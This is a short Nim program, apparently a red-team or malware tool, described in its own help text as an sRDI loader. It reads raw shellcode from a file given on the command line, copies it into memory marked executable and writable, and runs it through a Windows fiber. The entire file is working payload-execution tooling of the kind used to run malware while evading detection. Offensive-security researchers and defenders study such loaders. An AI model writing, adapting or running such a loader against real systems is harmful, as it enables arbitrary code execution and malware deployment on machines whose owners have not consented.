import winim/lean
import argparse

proc stringToBytes(s: string): seq[byte] =
  for i in s:
    result.add(byte(i))

proc getFileContents(path: string): seq[byte] = 
  var file: File
  file = open(path,FileMode.fmRead)
  var contents = readAll(file)
  file.close()
  stringToBytes(contents)

proc runFiber(shellcode: openArray[byte]): void =
    discard ConvertThreadToFiber(NULL)
    let vAlloc = VirtualAlloc(NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
    var bytesWritten: SIZE_T
    let pHandle = GetCurrentProcess()
    WriteProcessMemory( pHandle, vAlloc, unsafeaddr shellcode, cast[SIZE_T](shellcode.len), addr bytesWritten)
    let xFiber = CreateFiber(0, cast[LPFIBER_START_ROUTINE](vAlloc), NULL)
    SwitchToFiber(xFiber)
    quit(0)

when isMainModule:
  var p = newParser:
    help("A nim implementation of sRDI loader")
    arg("binfile", help="Specify the shellcode file.", nargs = 1)
  try:
    var
      shellcode: seq[byte]
      binpath: string
    var opts = p.parse()
    binpath = opts.binfile
    shellcode = getFileContents(binpath)
    runFiber(shellcode)
  except ShortCircuit as err:
    if err.flag == "argparse_help":
      echo err.help
      quit(1)
  except UsageError:
    stderr.writeLine getCurrentExceptionMsg()
    quit(1)
